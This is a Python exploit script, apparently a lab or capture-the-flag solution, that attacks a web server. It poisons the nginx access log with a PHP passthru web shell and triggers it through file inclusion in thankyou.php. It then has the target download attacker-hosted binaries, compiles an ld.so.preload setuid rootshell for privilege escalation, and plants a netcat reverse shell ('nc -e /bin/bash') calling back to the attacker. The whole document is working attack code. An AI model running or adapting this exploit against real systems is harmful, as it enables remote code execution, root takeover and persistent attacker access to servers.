#!/usr/bin/python
# -*- coding: iso-8859-15 -*-
import requests
import sys
import socket
import time
import psutil
import os
from telnetlib import Telnet

banner = ""
banner += " ██░ ██ ▓█████  ██▓     ██▓ ▒█████    ██████ \n"
banner += "▓██░ ██▒▓█   ▀ ▓██▒    ▓██▒▒██▒  ██▒▒██    ▒ \n"
banner += "▒██▀▀██░▒███   ▒██░    ▒██▒▒██░  ██▒░ ▓██▄   \n"
banner += "░▓█ ░██ ▒▓█  ▄ ▒██░    ░██░▒██   ██░  ▒   ██▒\n"
banner += "░▓█▒░██▓░▒████▒░██████▒░██░░ ████▓▒░▒██████▒▒\n"
banner += " ▒ ░░▒░▒░░ ▒░ ░░ ▒░▓  ░░▓  ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░\n"
banner += " ▒ ░▒░ ░ ░ ░  ░░ ░ ▒  ░ ▒ ░  ░ ▒ ▒░ ░ ░▒  ░ ░\n"
banner += " ░  ░░ ░   ░     ░ ░    ▒ ░░ ░ ░ ▒  ░  ░  ░  \n"
banner += " ░  ░  ░   ░  ░    ░  ░ ░      ░ ░        ░  coded by Silky"
                                             


usage = '''
Usage: python exploit.py RHOST LHOST LPORT 

'''


#rev rootshell
try:
   # test17 = sys.argv[1]
    RHOST = sys.argv[1]
    lhost = sys.argv[2]
    lport = sys.argv[3]
except:
	print(banner)
	print(usage)
	sys.exit(0)



payload =  "GET /<?php passthru($_GET['test17']); ?> HTTP/1.1 \n"
payload += "Host:" + RHOST + "\n"
payload += "Connection: close \n\r\n" 
print(banner)
print ("\n[+] Start your nc listener")
print ("[+] Paste the first three lines in and hit Return")
print("[+] Payload starts here")
print(payload)
try:
	os.system("nc "+ RHOST + " 80")
except KeyboardInterrupt:
	test.close()
	


def create_exploits():

    libhax_c = '''
    #include <stdio.h>
    #include <sys/types.h>
    #include <unistd.h>
    __attribute__ ((__constructor__))
    void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!");
    }   
    '''


    f= open("libhax.c","w+")
    f.write(libhax_c)



    rootshell_c = '''
    #include <stdio.h>
    #include <stdlib.h>
    int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    system("/bin/bash /tmp/rev.sh");
    }
    '''


    f= open("rootshell.c","w+")
    f.write(rootshell_c)




def compile_exploits():
    os.system("gcc -fPIC -shared -ldl -o libhax.so libhax.c")
    os.system("gcc -o rootshell rootshell.c")


def terminate_proc():
    for process in psutil.process_iter():
        if process.cmdline() == ['python', '-m', 'SimpleHTTPServer', '80']:
            print('Process found. Terminating it.')
            process.terminate()



def stageone():
    print("[+] Fire Stage One")
    print("[+] Downloading Exploit")
    data = 'wget http://'+lhost+'/libhax.so -O /tmp/libhax.so'
    data3 = 'wget http://'+lhost+'/rootshell -O /tmp/rootshell'
    data4 = 'wget http://'+lhost+'/com.sh -O /tmp/com.sh'
    data5 = 'chmod +x /tmp/rootshell'

    payload = "nc -e /bin/bash " +lhost + " " +lport
    data6 = 'echo "'+payload+'" > /tmp/rev.sh'
    r = requests.post("http://"+RHOST+"/thankyou.php?file=/var/log/nginx/access.log&test17="+ data6)
    r = requests.post("http://"+RHOST+"/thankyou.php?file=/var/log/nginx/access.log&test17=" + data)
    r = requests.post("http://"+RHOST+"/thankyou.php?file=/var/log/nginx/access.log&test17=" + data3)
    r = requests.post("http://"+RHOST+"/thankyou.php?file=/var/log/nginx/access.log&test17=" + data4)
    time.sleep(5)
    terminate_proc()
    print ("Sleeping 10 secs")
    time.sleep(10)


    print ("[+] Now we create our /etc/ld.so.preload file...\n")
    data6 = '/bin/bash /tmp/com.sh'
    r = requests.post("http://"+RHOST+"/thankyou.php?file=/var/log/nginx/access.log&test17=" + data6) 

    print("[+] Done!")


#try:
#### Local File Inclusion 
#	print("[+] Triggering RCE")
#	LFI = "http://" + RHOST +"/thankyou.php?file=/var/log/nginx/access.log&test17=" +test17 


#	r =requests.get(LFI)
#	data = r.content
#	print data
#except:
#	sys.exit(0)





create_exploits()
compile_exploits()
stageone()